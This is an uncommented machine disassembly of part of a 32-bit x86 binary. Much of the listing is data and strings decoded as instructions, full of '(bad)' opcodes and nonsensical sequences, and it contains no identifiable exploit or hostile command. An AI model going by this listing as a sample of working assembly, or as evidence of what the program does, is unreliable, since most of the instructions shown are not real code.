  433548:	add    ecx,DWORD PTR [eax+ecx*1-0xccd17b1]
  43354f:	cmp    bh,bh
  433551:	jne    0x433598
  433553:	lea    ecx,[ebx-0x38372750]
  433559:	inc    ebx
  43355b:	mov    eax,ecx
  43355d:	mov    eax,0xa00c111
  433562:	jne    0x4335a9
  433564:	mov    esi,DWORD PTR [ebx]
  433566:	test   al,0x3
  433568:	inc    ebp
  433569:	mov    DWORD PTR [eax-0xc],edx
  43356c:	loop   0x4335b3
  43356e:	push   DWORD PTR [ebx]
  433570:	mov    ecx,DWORD PTR [ebp+0x724d3010]
  433576:	add    DWORD PTR [eax],eax
  433578:	mov    eax,edi
  43357a:	lods   al,BYTE PTR ds:[esi]
  43357b:	dec    ebp
  43357c:	inc    ebp
  43357d:	mov    ecx,DWORD PTR [ecx+0x45cf14f4]
  433583:	retf   
  433584:	mov    edx,ecx
  433586:	adc    al,0x84
  433588:	(bad)  
  433589:	std    
  43358a:	ret    
  43358b:	jmp    FWORD PTR [edi-0x2b7474bb]
  433591:	hlt    
  433592:	rol    edi,0x82
  433595:	ret    
  433596:	cld    
  433597:	enter  0x11ff,0x45
  43359b:	inc    ebp
  43359c:	pop    edi
  43359d:	mov    ebx,DWORD PTR [ebx+0x14]
  4335a0:	ret    0xc7
  4335a3:	test   BYTE PTR [ebx+0x4532519b],cl
  4335a9:	jmp    0x433536
  4335ab:	push   0x8
  4335ad:	call   DWORD PTR [esi]
  4335af:	in     al,dx
  4335b0:	add    BYTE PTR [ebp+0x1],0x50
  4335b4:	add    bh,ah
  4335b6:	add    bh,bh
  4335b8:	icebp  
  4335b9:	mov    ecx,DWORD PTR [eax]
  4335bb:	cld    
  4335bc:	pop    es
  4335bd:	dec    ebp
  4335be:	shl    DWORD PTR [ebx],0x72
  4335c1:	add    eax,DWORD PTR [eax]
  4335c3:	cmp    edx,ecx
  4335c5:	je     0x4335d7
  4335c7:	mov    esi,DWORD PTR [ebp-0x4]
  4335ca:	inc    edi
  4335cc:	or     al,0xc3
  4335ce:	jmp    FWORD PTR [edx-0x18]
  4335d1:	(bad)  
  4335d2:	sti    
  4335d3:	cwde   
  4335d4:	(bad)  
  4335d5:	call   0xffa12ee0
  4335da:	or     al,0x45
  4335dc:	push   ebp
  4335dd:	sub    esp,0x18
  4335e0:	push   ebx
  4335e1:	inc    ebp
  4335e2:	mov    edi,edi
  4335e4:	mov    ebp,DWORD PTR [eax+ecx*1+0x578b4d75]
  4335eb:	test   al,0x54
  4335ed:	inc    ebp
  4335ee:	push   ecx
  4335ef:	push   eax
  4335f0:	xor    ebp,DWORD PTR [ebx-0x748d0041]
  4335f6:	add    ah,bh
  4335f8:	(bad)  
  4335f9:	dec    ebp
  4335fa:	add    DWORD PTR [ebx],esi
  4335fc:	inc    ebp
  4335fd:	add    ecx,DWORD PTR [ebx+0x74943b]
  433603:	push   0xffffff8b
  433605:	dec    DWORD PTR [ebx-0x7fbaeb54]
  43360b:	add    eax,DWORD PTR [ecx]
  43360d:	or     BYTE PTR [eax],al
  43360f:	call   0xff852e14
  433614:	mov    eax,DWORD PTR [ebp+0x14]
  433617:	mov    ecx,DWORD PTR [ecx+0x801ac]
  43361d:	inc    ebp
  43361e:	dec    ecx
  43361f:	add    ebp,DWORD PTR [edx+0x14]
  433622:	push   0x8b3045
  433627:	call   0x33ad839c
  43362c:	inc    DWORD PTR [ebx]
  43362e:	mov    DWORD PTR [edi],ecx
  433630:	mov    eax,ecx
  433632:	or     BYTE PTR [ebp-0x3d],cl
  433635:	cmp    eax,edi
  433637:	cmovne esp,DWORD PTR [ebx+ecx*4-0x1]
  43363c:	adc    BYTE PTR [ebx+0x5eff0845],cl
  433642:	adc    al,0xc9
  433644:	inc    ebp
  433645:	adc    BYTE PTR [eax+0x55],dl
  433648:	jne    0x433636
  43364a:	call   0xff5435da
  43364f:	dec    ebp
  433650:	inc    ebp
  433651:	mov    ecx,DWORD PTR [ebx+0x390338b]
  433657:	add    BYTE PTR [ebx],bh
  433659:	mov    esi,DWORD PTR [ecx+eax*4-0x75]
  43365d:	push   esp
  43365e:	or     al,0x51
  433660:	dec    ebp
  433661:	xor    DWORD PTR [ebx],0xf32039b
  433667:	cmp    eax,DWORD PTR [ebp+0x74]
  43366a:	mov    edi,edi
  43366c:	pop    edi
  43366d:	adc    BYTE PTR [ebx+0x75],bl
  433670:	ret    0x50
  433673:	mov    edx,DWORD PTR ss:[edi-0x7d]
  433677:	(bad)  
  433678:	clc    
  433679:	mov    esp,ebp
  43367b:	pop    ecx
  43367c:	mov    ecx,0xf80085c2
  433681:	mov    ecx,DWORD PTR [ecx+edx*2]
  433684:	push   esi
  433685:	push   esi
  433686:	(bad)  
  433687:	lock add DWORD PTR [ebp+0x44],eax
  43368b:	mov    edx,DWORD PTR [eax]
  43368d:	adc    BYTE PTR [ebx+edi*4+0x8],bh
  433691:	or     BYTE PTR [edi+eax*1+0x51],dl
  433695:	ret    
  433696:	xor    ebx,DWORD PTR [ebx+0x37232be]
  43369c:	add    BYTE PTR [ecx+0x147c8bfe],cl
  4336a2:	or     al,0x80
  4336a4:	jge    0x4336a7
  4336a6:	mov    DWORD PTR [eax],eax
  4336a8:	and    al,0x8
  4336aa:	cmp    DWORD PTR [ebp+0x10],eax
  4336ad:	mov    edx,DWORD PTR [esi]
  4336af:	xchg   esp,eax
  4336b0:	dec    esp
  4336b1:	add    BYTE PTR [eax],dl
  4336b3:	mov    ecx,edx
  4336b5:	add    edx,DWORD PTR [esp+edi*1+0x8]
  4336b9:	dec    ebp
  4336ba:	into   
  4336bb:	mov    ebp,DWORD PTR [edi+0x240089d8]
  4336c1:	mov    edx,DWORD PTR [eax+0x14]
  4336c4:	das    
  4336c5:	add    al,0x45
  4336c7:	add    BYTE PTR [ebp+0x0],dh
  4336ca:	mov    edi,edi
  4336cc:	and    al,0x50
  4336ce:	mov    eax,DWORD PTR [eax]
  4336d0:	and    al,0xd1
  4336d2:	xor    eax,DWORD PTR [esi]
  4336d4:	lea    eax,[ebp+0x8]
  4336d7:	xor    esi,DWORD PTR [edx+0x3]
  4336da:	add    BYTE PTR [ecx+0x4510fc44],cl
  4336e0:	xor    ecx,DWORD PTR [ebx+0x75eb0c9c]
  4336e6:	or     DWORD PTR [ebp-0x7a03f0],0x541608f8
  4336f0:	cmp    al,0xff
  4336f2:	pushf  
  4336f3:	mov    edi,edi
  4336f5:	or     BYTE PTR [esi+ecx*1],cl
  4336f8:	jne    0x4336bd
  4336fa:	call   0xc36c6
  4336ff:	adc    BYTE PTR [ebp+eax*2+0xc],al
  433703:	mov    ebx,DWORD PTR [eax]
  433705:	adc    BYTE PTR [ebx+eax*8+0x14],dh
  433709:	mov    DWORD PTR [edi+ebp*4+0x10],0xff0175fc
  433711:	pop    esi
  433712:	and    al,0xc9
  433714:	and    al,0x10
  433716:	call   DWORD PTR [ebp-0x73]
  433719:	in     al,dx
  43371a:	jmp    esp
  43371c:	je     0x4336a1
  43371e:	call   DWORD PTR [eax]
  433720:	and    al,0x31
  433722:	call   0xffcd35c3
  433727:	and    al,0x44
  433729:	push   edi
  43372a:	or     al,0x41
  43372c:	pop    esi
  43372d:	mov    ebp,esp
  43372f:	and    al,0xc2
  433731:	mov    eax,DWORD PTR [eax]
  433733:	and    al,0x85
  433735:	mov    edx,0x733080e
  43373a:	jne    0x433736
  43373c:	test   DWORD PTR [ebx+0x3083275],ebx
  433742:	dec    DWORD PTR [ecx-0x74dbdb15]
  433748:	sbb    BYTE PTR [esp+edx*1],cl
  43374b:	jl     0x43374c
  43374d:	adc    al,0x24
  43374f:	dec    ebp
  433750:	mov    esi,DWORD PTR [ebp+0xc]
  433753:	mov    ecx,DWORD PTR [eax]
  433755:	and    al,0x39
  433757:	xor    ebx,DWORD PTR [ebx+ecx*4]
  43375a:	or     BYTE PTR [eax+edx*1],ah
  43375d:	add    eax,DWORD PTR [edi+ecx*1+0x4c24ca32]
  433764:	clc    
  433765:	jmp    0x433703
  433767:	adc    al,bh
  433769:	inc    esp
  43376a:	je     0x4337b8
  43376c:	and    al,0xc2
  43376e:	je     0x43370b
  433770:	mov    ecx,DWORD PTR [ecx+0x687d685d]
  433776:	dec    DWORD PTR [ecx+0x235fbf08]
  43377c:	sbb    al,0x10
  43377e:	add    BYTE PTR [esi+edi*1+0x10],cl
  433782:	add    BYTE PTR [ebx+0xb],dh
  433785:	adc    BYTE PTR [eax],al
  433787:	mov    WORD PTR ds:0x3d450010,?
  43378d:	adc    BYTE PTR [eax],al
  43378f:	add    DWORD PTR [eax+edx*1],esp
  433792:	add    BYTE PTR [edx+0x6],cl
  433795:	adc    BYTE PTR [eax],al
  433797:	sub    dx,WORD PTR [eax]
  43379a:	add    bh,dl
  43379c:	imul   edx,DWORD PTR [eax],0x10302300
  4337a2:	add    BYTE PTR [esi+0x7b001077],dl
  4337a8:	aaa    
  4337a9:	inc    ebx
  4337aa:	add    BYTE PTR [edi+0x37],bh
  4337ad:	inc    ebx
  4337ae:	add    BYTE PTR [ebx-0x78ffbcc9],al
  4337b4:	aaa    
  4337b5:	inc    ebx
  4337b6:	add    BYTE PTR [ebx-0x70ffbcc9],cl
  4337bc:	aaa    
  4337bd:	inc    ebx
  4337be:	add    BYTE PTR [ebx-0x68ffbcc9],dl
  4337c4:	aaa    
  4337c5:	inc    ebx
  4337c6:	add    BYTE PTR [ebx-0x60ffbcc9],bl
  4337cc:	aaa    
  4337cd:	inc    ebx
  4337ce:	add    BYTE PTR [ebx-0x5fffbcc9],ah
  4337d4:	adc    DWORD PTR [eax],edx
  4337d6:	add    BYTE PTR [ecx],cl
  4337d8:	jo     0x4337ea
  4337da:	add    BYTE PTR ds:0xd7001027,ch
  4337e0:	pop    eax
  4337e1:	adc    BYTE PTR [eax],al
  4337e3:	push   es
  4337e4:	adc    al,0x10
  4337e6:	add    BYTE PTR [esi+0x33001031],ah
  4337ec:	ins    BYTE PTR es:[edi],dx
  4337ed:	adc    BYTE PTR [eax],al
  4337ef:	jb     0x433830
  4337f1:	adc    BYTE PTR [eax],al
  4337f3:	shl    DWORD PTR [edi],cl
  4337f5:	inc    ebx
  4337f6:	add    bh,dl
  4337f8:	aaa    
  4337f9:	inc    ebx
  4337fa:	add    bl,bl
  4337fc:	aaa    
  4337fd:	inc    ebx
  4337fe:	add    bh,bl
  433800:	aaa    
  433801:	inc    ebx
  433802:	add    bl,ah
  433804:	aaa    
  433805:	inc    ebx
  433806:	add    bh,ah
  433808:	aaa    
  433809:	inc    ebx
  43380a:	add    bl,ch
  43380c:	aaa    
  43380d:	inc    ebx
  43380e:	add    bh,ch
  433810:	aaa    
  433811:	inc    ebx
  433812:	add    dh,cl
  433814:	jge    0x433826
  433816:	add    BYTE PTR [esi-0x3dffef8e],dl
  43381c:	or     dl,BYTE PTR [eax]
  43381e:	add    dh,bl
  433820:	sub    dl,BYTE PTR [eax]
  433822:	add    BYTE PTR [edx],bl
  433824:	ins    BYTE PTR es:[edi],dx
  433825:	adc    BYTE PTR [eax],al
  433827:	addr16 jno 0x43383a
  43382a:	add    BYTE PTR [ebp+0x3d],ch
  43382d:	adc    BYTE PTR [eax],al
  43382f:	lds    esp,FWORD PTR [eax+0x10]
  433832:	add    BYTE PTR [ebx],dl
  433834:	cmp    BYTE PTR [ebx+0x0],al
  433837:	pop    ss
  433838:	cmp    BYTE PTR [ebx+0x0],al
  43383b:	sbb    edi,DWORD PTR [eax]
  43383d:	inc    ebx
  43383e:	add    BYTE PTR [edi],bl
  433840:	cmp    BYTE PTR [ebx+0x0],al
  433843:	and    edi,DWORD PTR [eax]
  433845:	inc    ebx
  433846:	add    BYTE PTR [edi],ah
  433848:	cmp    BYTE PTR [ebx+0x0],al
  43384b:	sub    edi,DWORD PTR [eax]
  43384d:	inc    ebx
  43384e:	add    BYTE PTR [edi],ch
  433850:	cmp    BYTE PTR [ebx+0x0],al
  433853:	cmp    al,0x14
  433855:	adc    BYTE PTR [eax],al
  433857:	clc    
  433858:	cmp    dl,BYTE PTR [eax]
  43385a:	add    BYTE PTR [ecx],ah
  43385c:	pop    ds
  43385d:	adc    BYTE PTR [eax],al
  43385f:	mov    edi,0x6001073
  433864:	adc    al,0x10
  433866:	add    BYTE PTR [ecx+0x34],bh
  433869:	adc    BYTE PTR [eax],al
  43386b:	cmp    edi,DWORD PTR [eax+edx*1+0x0]
  43386f:	shl    DWORD PTR [edx+0x10],1
  433872:	add    BYTE PTR [ebx+0x38],dl
  433875:	inc    ebx
  433876:	add    BYTE PTR [edi+0x38],dl
  433879:	inc    ebx
  43387a:	add    BYTE PTR [ebx+0x38],bl
  43387d:	inc    ebx
  43387e:	add    BYTE PTR [edi+0x38],bl
  433881:	inc    ebx
  433882:	add    BYTE PTR [ebx+0x38],ah
  433885:	inc    ebx
  433886:	add    BYTE PTR [edi+0x38],ah
  433889:	inc    ebx
  43388a:	add    BYTE PTR [ebx+0x38],ch
  43388d:	inc    ebx
  43388e:	add    BYTE PTR [edi+0x38],ch
  433891:	inc    ebx
  433892:	add    BYTE PTR [ebp+0x14],al
  433895:	adc    BYTE PTR [eax],al
  433897:	fwait
  433898:	pop    ds
  433899:	adc    BYTE PTR [eax],al
  43389b:	jnp    0x4338c0
  43389d:	adc    BYTE PTR [eax],al
  43389f:	pop    esi
  4338a0:	adc    BYTE PTR cs:[eax],al
  4338a3:	popf   
  4338a4:	jno    0x4338b6
  4338a6:	add    ah,bl
  4338a8:	inc    ebp
  4338a9:	adc    BYTE PTR [eax],al
  4338ab:	sbb    edx,DWORD PTR [edx+0x10]
  4338ae:	add    BYTE PTR [edx-0x6cffefd7],bl
  4338b4:	cmp    BYTE PTR [ebx+0x0],al
  4338b7:	xchg   edi,eax
  4338b8:	cmp    BYTE PTR [ebx+0x0],al
  4338bb:	fwait
  4338bc:	cmp    BYTE PTR [ebx+0x0],al
  4338bf:	lahf   
  4338c0:	cmp    BYTE PTR [ebx+0x0],al
  4338c3:	mov    ds:0xa7004338,eax
  4338c8:	cmp    BYTE PTR [ebx+0x0],al
  4338cb:	stos   DWORD PTR es:[edi],eax
  4338cc:	cmp    BYTE PTR [ebx+0x0],al
  4338cf:	scas   eax,DWORD PTR es:[edi]
  4338d0:	cmp    BYTE PTR [ebx+0x0],al
  4338d3:	push   esp
  4338d4:	xor    al,0x4b
  4338d6:	aaa    
  4338d7:	pop    edi
  4338d8:	inc    edx
  4338d9:	dec    ebx
  4338da:	xor    DWORD PTR [ecx],edi
  4338dc:	push   edi
  4338dd:	add    BYTE PTR [ecx+0x39],cl
  4338e0:	xor    al,0x5f
  4338e2:	pop    ecx
  4338e3:	inc    edi
  4338e4:	push   edx
  4338e5:	pop    edi
  4338e6:	dec    edx
  4338e7:	xor    al,BYTE PTR [edx+0x30]
  4338ea:	push   ebx
  4338eb:	add    BYTE PTR [ecx+0x4a],cl
  4338ee:	cmp    BYTE PTR [edi+0x38],bl
  4338f1:	xor    al,0x43
  4338f3:	xor    bl,BYTE PTR [eax+0x36]
  4338f6:	pop    edi
  4338f7:	inc    ebx
  4338f8:	add    BYTE PTR [edx+0x33],cl
  4338fb:	dec    ebp
  4338fc:	cmp    BYTE PTR [edi+0x53],bl
  4338ff:	xor    DWORD PTR [eax],edi
  433901:	pop    edx
  433902:	pop    edi
  433903:	xor    BYTE PTR [edx+0x52],cl
  433906:	inc    ecx
  433907:	add    BYTE PTR [edx+0x42],al
  43390a:	inc    ebp
  43390b:	pop    edi
  43390c:	cmp    DWORD PTR [eax],edi
  43390e:	push   ebp
  43390f:	inc    edx
  433910:	xor    eax,0x5244505f
  433915:	xor    BYTE PTR [eax],al
  433917:	inc    edx
  433918:	inc    esp
  433919:	inc    edx
  43391a:	cmp    DWORD PTR [edi+0x52],ebx
  43391d:	dec    esp
  43391e:	inc    ebp
  43391f:	add    BYTE PTR [ebx+0x37],dl
  433922:	push   esp
  433923:	xor    BYTE PTR [edi+0x55],bl
  433926:	push   ebx
  433927:	aaa    
  433928:	dec    ebp
  433929:	pop    edi
  43392a:	xor    ecx,DWORD PTR [edx+0x4e]
  43392d:	dec    ebx
  43392e:	add    BYTE PTR [edx+0x47],cl
  433931:	inc    edi
  433932:	xor    eax,0x534e5f32
  433937:	push   esp
  433938:	pop    edi
  433939:	push   esp
  43393a:	inc    edx
  43393b:	add    BYTE PTR [ebx+0x4d],al
  43393e:	xor    BYTE PTR [edi+0x47],bl
  433941:	cmp    DWORD PTR [ecx+0x5f],ebx
  433944:	push   eax
  433945:	push   ecx
  433946:	push   ecx
  433947:	pop    edi
  433948:	inc    ebx
  433949:	push   edi
  43394a:	push   esi
  43394b:	add    BYTE PTR [ecx+0x57],cl
  43394e:	inc    ebp
  43394f:	pop    edi
  433950:	pop    ecx
  433951:	push   edx
  433952:	inc    edx
  433953:	pop    edi
  433954:	inc    edi
  433955:	add    BYTE PTR [ebx+0x51],dl
  433958:	cmp    DWORD PTR ds:0x4d305f33,esi
  43395e:	inc    edi
  43395f:	xor    edx,DWORD PTR [edx+0x34]
  433962:	pop    edi
  433963:	pop    edx
  433964:	cmp    BYTE PTR [eax],al
  433966:	inc    edi
  433967:	xor    esi,DWORD PTR ds:0x5451585f
  43396d:	dec    esp
  43396e:	add    BYTE PTR [edi+esi*1+0x34],cl
  433972:	pop    edi
  433973:	cmp    BYTE PTR [edi+0x49],dl
  433976:	xor    eax,0x5700505f
  43397b:	cmp    DWORD PTR [edi+ebx*2+0x50],eax
  43397f:	dec    esi
  433980:	dec    edx
  433981:	cmp    BYTE PTR [eax],al
  433983:	pop    edx
  433984:	dec    ebx
  433985:	xor    eax,0x4f5f3131
  43398a:	xor    dh,BYTE PTR [ecx]
  43398c:	pop    edi
  43398d:	inc    ebp
  43398e:	push   esp
  43398f:	inc    esp
  433990:	inc    ebp
  433991:	add    BYTE PTR [edi+0x55],dl
  433994:	cmp    DWORD PTR [edi+0x5a],ebx
  433997:	push   edx
  433998:	inc    edi
  433999:	xor    DWORD PTR [ebp+0x0],ecx
  43399c:	pop    edx
  43399d:	dec    ecx
  43399e:	dec    ebp
  43399f:	ss pop edi
  4339a1:	pop    edx
  4339a2:	push   edx
  4339a3:	cmp    BYTE PTR [esi+0x30],dl
  4339a6:	pop    edi
  4339a7:	push   ecx
  4339a8:	dec    esi
  4339a9:	add    BYTE PTR [ebx+0x32],dl
  4339ac:	inc    ebx
  4339ad:	cmp    BYTE PTR [edi+0x52],bl
  4339b0:	dec    ecx
  4339b1:	xor    BYTE PTR [eax],al
  4339b3:	inc    edi
  4339b4:	xor    eax,0x314f5f4b
  4339b9:	xor    DWORD PTR [edi+0x38],ebx
  4339bc:	push   ebp
  4339bd:	add    BYTE PTR [edi+0x4b],al
  4339c0:	xor    bl,BYTE PTR [edi+0x43]
  4339c3:	push   ebp
  4339c4:	cmp    DWORD PTR [ebp+0x4b],ecx
  4339c7:	ss pop edi
  4339c9:	pop    edx
  4339ca:	push   edi
  4339cb:	inc    esp
  4339cc:	xor    BYTE PTR [eax],al
  4339ce:	dec    ecx
  4339cf:	inc    edi
  4339d0:	xor    eax,0x3058555f
  4339d5:	dec    ebx
  4339d6:	pop    edi
  4339d7:	push   edi
  4339d8:	add    BYTE PTR [eax+0x0],bl
  4339db:	inc    edi
  4339dc:	add    BYTE PTR [edx+0x0],al
  4339df:	pop    edi
  4339e0:	add    BYTE PTR [ebx],dh
  4339e2:	add    BYTE PTR [eax],bh
  4339e4:	add    BYTE PTR [ebx+0x0],cl
  4339e7:	xor    eax,0x33003500
  4339ec:	add    BYTE PTR [eax],dh
  4339ee:	add    BYTE PTR [edi+0x0],bl
  4339f1:	push   esp
  4339f2:	add    BYTE PTR [ebp+0x0],cl
  4339f5:	xor    BYTE PTR [eax],al
  4339f7:	add    BYTE PTR [eax],al
  4339f9:	inc    esi
  4339fa:	add    BYTE PTR [eax+0x0],bl
  4339fd:	xor    BYTE PTR [eax],al
  4339ff:	pop    edi
  433a00:	add    BYTE PTR [ecx],dh
  433a02:	add    BYTE PTR [ebx+0x0],al
  433a05:	xor    eax,0x5f003100
  433a0a:	add    BYTE PTR [ecx+0x0],al
  433a0d:	xor    eax,DWORD PTR [eax]
  433a0f:	add    BYTE PTR [eax],al
  433a11:	push   ebx
  433a12:	add    BYTE PTR [ebx+0x0],dl
  433a15:	dec    eax
  433a16:	add    BYTE PTR [edi+0x0],bl
  433a19:	push   esp
  433a1a:	add    BYTE PTR [ebx+0x0],al
  433a1d:	push   ebx
  433a1e:	add    BYTE PTR [edx+0x0],dl
  433a21:	pop    edi
  433a22:	add    BYTE PTR [ecx+0x0],dl
  433a25:	dec    edi
  433a26:	add    BYTE PTR [edi+0x0],al
  433a29:	push   ecx
  433a2a:	add    BYTE PTR [edi+0x0],bl
  433a2d:	pop    ecx
  433a2e:	add    BYTE PTR [eax],al
  433a30:	add    BYTE PTR [edi+0x0],cl
  433a33:	dec    edi
  433a34:	add    BYTE PTR [ebp+0x0],dl
  433a37:	cmp    DWORD PTR [eax],eax
  433a39:	pop    edi
  433a3a:	add    BYTE PTR [edx],dh
  433a3c:	add    BYTE PTR [eax+eax*1+0x32],al
  433a40:	add    BYTE PTR ds:0x47005f00,dh
  433a46:	add    BYTE PTR ds:0x48000000,dh
  433a4c:	add    BYTE PTR [edx+0x0],cl
  433a4f:	push   eax
  433a50:	add    BYTE PTR [edi+0x0],bl
  433a53:	cmp    BYTE PTR [eax],al
  433a55:	add    BYTE PTR ss:0x55004100,dh
  433a5c:	add    BYTE PTR [edi+0x0],bl
  433a5f:	push   edx
  433a60:	add    BYTE PTR [edi],dh
  433a62:	add    BYTE PTR [ecx+0x0],cl
  433a65:	add    BYTE PTR [eax],al
  433a67:	inc    esp
  433a68:	add    BYTE PTR [ecx+0x0],dl
  433a6b:	inc    edx
  433a6c:	add    BYTE PTR [edi+0x0],bl
  433a6f:	push   ecx
  433a70:	add    BYTE PTR [ecx+0x0],bl
  433a73:	dec    edi
  433a74:	add    BYTE PTR [eax+0x0],dl
  433a77:	add    BYTE PTR [eax],al
  433a79:	dec    edx
  433a7a:	add    BYTE PTR [ecx+0x0],dl
  433a7d:	inc    esp
  433a7e:	add    BYTE PTR [edi+0x0],bl
  433a81:	dec    edx
  433a82:	add    BYTE PTR [eax],dh
  433a84:	add    BYTE PTR [ecx],dh
  433a86:	add    BYTE PTR [ebx+0x0],dl
  433a89:	push   ecx
  433a8a:	add    BYTE PTR [ecx],dh
  433a8c:	add    BYTE PTR [edi+0x0],bl
  433a8f:	push   edi
  433a90:	add    BYTE PTR [eax],al
  433a92:	add    BYTE PTR [ebx+0x0],cl
  433a95:	pop    edx
  433a96:	add    BYTE PTR [esi],dh
  433a98:	add    BYTE PTR [edi+0x0],bl
  433a9b:	inc    ebx
  433a9c:	add    BYTE PTR [eax+eax*1+0x5a],dl
  433aa0:	add    BYTE PTR [edi+0x0],bl
  433aa3:	push   edi
  433aa4:	add    BYTE PTR [ebx],dh
  433aa6:	add    BYTE PTR [esi+0x0],cl
  433aa9:	push   ebp
  433aaa:	add    BYTE PTR [edi+0x0],bl
  433aad:	dec    edx
  433aae:	add    BYTE PTR [eax],al
  433ab0:	add    BYTE PTR [edi+0x0],dl
  433ab3:	aaa    
  433ab4:	add    BYTE PTR [eax],bh
  433ab6:	add    BYTE PTR [edi+0x0],bl
  433ab9:	pop    eax
  433aba:	add    BYTE PTR [edi+0x0],cl
  433abd:	inc    edi
  433abe:	add    BYTE PTR [edi+0x0],bl
  433ac1:	xor    al,0x0
  433ac3:	push   eax
  433ac4:	add    BYTE PTR [ecx+0x0],cl
  433ac7:	push   ebp
  433ac8:	add    BYTE PTR [eax],al
  433aca:	add    BYTE PTR [edi+0x0],dl
  433acd:	push   esp
  433ace:	add    BYTE PTR [ebx+0x0],cl
  433ad1:	add    BYTE PTR [eax],al
  433ad3:	add    BYTE PTR [edx+0x53],dl
  433ad6:	inc    esp
  433ad7:	push   ebx
  433ad8:	nop
  433ad9:	aaa    
  433ada:	outs   dx,BYTE PTR ds:[esi]
  433adb:	jmp    0x5b8:0x49c67527
  433ae2:	nop
  433ae3:	jecxz  0x433b56
  433ae5:	push   ds
  433ae6:	sub    al,0x41
  433ae8:	sbb    eax,DWORD PTR [eax]
  433aea:	add    BYTE PTR [eax],al
  433aec:	push   esp
  433aed:	cmp    bl,BYTE PTR [ecx+edi*2+0x69]
  433af1:	addr16 push edi
  433af3:	bound  bx,DWORD PTR [edx+0x45]
  433af7:	outs   dx,BYTE PTR ds:[esi]
  433af8:	pop    esp
  433af9:	je     0x433b6e
  433afb:	ja     0x433b3e
  433afd:	imul   edx,DWORD PTR [ecx+esi*2+0x4d],0x63455c61
  433b05:	js     0x433b76
  433b07:	jp     0x433b78
  433b09:	jns    0x433b6f
  433b0b:	jp     0x433b75
  433b0d:	je     0x433b73
  433b0f:	jp     0x433b73
  433b11:	cs jo  0x433b78
  433b14:	bound  eax,QWORD PTR [eax]
	...
